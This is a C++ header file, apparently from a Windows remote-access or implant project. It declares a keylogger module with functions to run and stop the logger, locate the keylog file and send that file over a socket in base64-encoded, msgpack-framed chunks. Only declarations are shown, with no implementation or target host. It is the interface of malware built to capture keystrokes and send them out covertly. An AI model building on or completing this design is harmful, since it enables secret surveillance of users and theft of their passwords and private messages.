#pragma once
#include "../module.h"
#include <string>
#include <windows.h>
#include <fstream>
#include <vector>
#include <msgpack.hpp>

class Keylogger_Module : Module{
public:
    const char* name() const override;
    void run() override;

    std::string& getKeylogFileName();
    void stopKeylogger();  
    bool sendFileViaMsgPack(SOCKET sock, std::string& fileName);

private:
    std::vector<char> create_message(const std::string& content);
    std::string base64_encode(const std::vector<char>& data);
    bool sendFileInChunks(SOCKET sock, std::string& filename, const std::vector<char>& filedata);
    bool send_message(SOCKET sock, const std::string& msg);
};